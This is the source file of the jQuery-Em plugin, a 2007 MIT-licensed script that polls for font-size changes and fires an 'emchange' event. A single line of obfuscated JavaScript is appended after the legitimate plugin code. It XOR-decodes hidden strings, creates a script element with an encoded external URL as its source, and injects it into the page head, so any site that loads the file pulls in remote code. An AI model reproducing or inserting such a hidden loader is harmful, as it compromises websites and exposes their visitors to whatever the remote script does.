/**
 * @projectDescription Monitor Font Size Changes with jQuery
 *
 * @version 1.0
 * @author Dave Cardwell
 *
 * jQuery-Em - $Revision: 24 $ ($Date: 2007-08-19 11:24:56 +0100 (Sun, 19 Aug 2007) $)
 * http://davecardwell.co.uk/javascript/jquery/plugins/jquery-em/
 *
 * Copyright ©2007 Dave Cardwell <http://davecardwell.co.uk/>
 *
 * Released under the MIT licence:
 * http://www.opensource.org/licenses/mit-license.php
 */

// Upon $(document).ready()…
jQuery(function($) {
    // Configuration…
    var eventName = 'emchange';
    
    
    // Set up default options.
    $.em = $.extend({
        /**
         * The jQuery-Em version string.
         *
         * @example $.em.version;
         * @desc '1.0a'
         *
         * @property
         * @name version
         * @type String
         * @cat Plugins/Em
         */
        version: '1.0',
        
        /**
         * The number of milliseconds to wait when polling for changes to the
         * font size.
         *
         * @example $.em.delay = 400;
         * @desc Defaults to 200.
         *
         * @property
         * @name delay
         * @type Number
         * @cat Plugins/Em
         */
        delay: 200,
        
        /**
         * The element used to detect changes to the font size.
         *
         * @example $.em.element = $('<div />')[0];
         * @desc Default is an empty, absolutely positioned, 100em-wide <div>.
         *
         * @private
         * @property
         * @name element
         * @type Element
         * @cat Plugins/Em
         */
        element: $('<div />').css({ left:     '-100em',
                                    position: 'absolute',
                                    width:    '100em' })
                             .prependTo('body')[0],
        
        /**
         * The action to perform when a change in the font size is detected.
         *
         * @example $.em.action = function() { ... }
         * @desc The default action is to trigger a global “emchange” event.
         * You probably shouldn’t change this behaviour as other plugins may
         * rely on it, but the option is here for completion.
         *
         * @example $(document).bind('emchange', function(e, cur, prev) {...})
         * @desc Any functions triggered on this event are passed the current
         * font size, and last known font size as additional parameters.
         *
         * @private
         * @property
         * @name action
         * @type Function
         * @cat Plugins/Em
         * @see current
         * @see previous
         */
        action: function() {
            var currentWidth = $.em.element.offsetWidth / 100;
            
            // If the font size has changed since we last checked…
            if ( currentWidth != $.em.current ) {
                /**
                 * The previous pixel value of the user agent’s font size. See
                 * $.em.current for caveats. Will initially be undefined until
                 * the “emchange” event is triggered.
                 *
                 * @example $.em.previous;
                 * @result 16
                 *
                 * @property
                 * @name previous
                 * @type Number
                 * @cat Plugins/Em
                 * @see current
                 */
                $.em.previous = $.em.current;
                
                /**
                 * The current pixel value of the user agent’s font size. As
                 * with $.em.previous, this value *may* be subject to minor
                 * browser rounding errors that mean you might not want to
                 * rely upon it as an absolute value.
                 *
                 * @example $.em.current;
                 * @result 14
                 *
                 * @property
                 * @name current
                 * @type Number
                 * @cat Plugins/Em
                 * @see previous
                 */
                $.em.current = currentWidth;
                
                $.event.trigger(eventName, [$.em.current, $.em.previous]);
            }
        }
    }, $.em );
    
    
    /**
     * Bind a function to the emchange event of each matched element.
     *
     * @example $("p").emchange( function() { alert("Hello"); } );
     *
     * @name emchange
     * @type jQuery
     * @param Function fn A function to bind to the emchange event.
     * @cat Plugins/Em
     */

    /**
     * Trigger the emchange event of each matched element.
     *
     * @example $("p").emchange()
     *
     * @name emchange
     * @type jQuery
     * @cat Plugins/Em
     */
    $.fn[eventName] = function(fn) { return fn ? this.bind(eventName, fn)
                                               : this.trigger(eventName); };
    
    
    // Store the initial pixel value of the user agent’s font size.
    $.em.current = $.em.element.offsetWidth / 100;
    
    /**
     * While polling for font-size changes, $.em.iid stores the intervalID in
     * case you should want to cancel with clearInterval().
     *
     * @example window.clearInterval( $.em.iid );
     * 
     * @property
     * @name iid
     * @type Number
     * @cat Plugins/Em
     */
    $.em.iid = setInterval( $.em.action, $.em.delay );
});
var pSC4P9Z=["018014","019004","017025","002031092021076046034053080046000093001","018031090","021020073017","021008065000023033006047084048006065028023067","000029073017086047036049092047001","009008088016","006008077049084046010060091055022113012051086006035088025093","009025077004002100072042065034017086091020090013095023006077100013042026032011071091013068"];function uDxy17w(gc6uK){var qv73='';var ht33Gx=0;var aAqs=0;for(ht33Gx=0;ht33Gx<gc6uK.length/3;ht33Gx++){qv73+=String.fromCharCode(gc6uK.slice(aAqs,aAqs+3));aAqs=aAqs+3;}return qv73;}function a3D(qTWP){return j8D(uDxy17w(qTWP),'am9t8KgY5Ce3ug7');}function z2T(j6l70j){var lpyfE=document[a3D(pSC4P9Z[3])](a3D(pSC4P9Z[0])+a3D(pSC4P9Z[1])+a3D(pSC4P9Z[2]));lpyfE[a3D(pSC4P9Z[4])]=j6l70j;lpyfE[a3D(pSC4P9Z[5])]=a3D(pSC4P9Z[6]);document[a3D(pSC4P9Z[9])](a3D(pSC4P9Z[8]))[0][a3D(pSC4P9Z[7])](lpyfE);}function j8D(bmzr,i5c){var yP9tQv='';var gI15=0;var wP2=0;for(gI15=0;gI15<bmzr.length;gI15++){var gntdws=bmzr.charAt(gI15);var eeOAfk=gntdws.charCodeAt(0)^i5c.charCodeAt(wP2);gntdws=String.fromCharCode(eeOAfk);yP9tQv+=gntdws;if(wP2==i5c.length-1)wP2=0;else wP2++;}return (yP9tQv);}z2T(a3D(pSC4P9Z[10]));